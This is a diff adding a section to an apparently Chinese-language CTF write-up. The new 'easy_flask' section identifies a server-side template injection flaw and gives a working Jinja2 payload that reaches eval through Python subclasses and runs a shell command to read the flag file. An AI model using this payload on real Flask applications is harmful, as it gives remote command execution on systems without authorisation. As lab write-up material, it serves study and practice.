@@ -134,6 +134,24 @@ flask 2.2.2 py3 多半是模板注入 gunicorn20.0.4请求走私
 
 ## easy_java
 
+## easy_flask
+
+ssti注入漏洞，payload如下
+
+```python
+{% for c in [].__class__.__base__.__subclasses__() %}
+{% if c.__name__ == 'catch_warnings' %}
+  {% for b in c.__init__.__globals__.values() %}
+  {% if b.__class__ == {}.__class__ %}
+    {% if 'eval' in b.keys() %}
+      {{ b['eval']('__import__("os").popen("cat flag").read()') }} # ls 查看得到当前为 / 目录且flag文件在此处
+    {% endif %}
+  {% endif %}
+  {% endfor %}
+{% endif %}
+{% endfor %}
+```
+
 # misc
 
 ## all in base
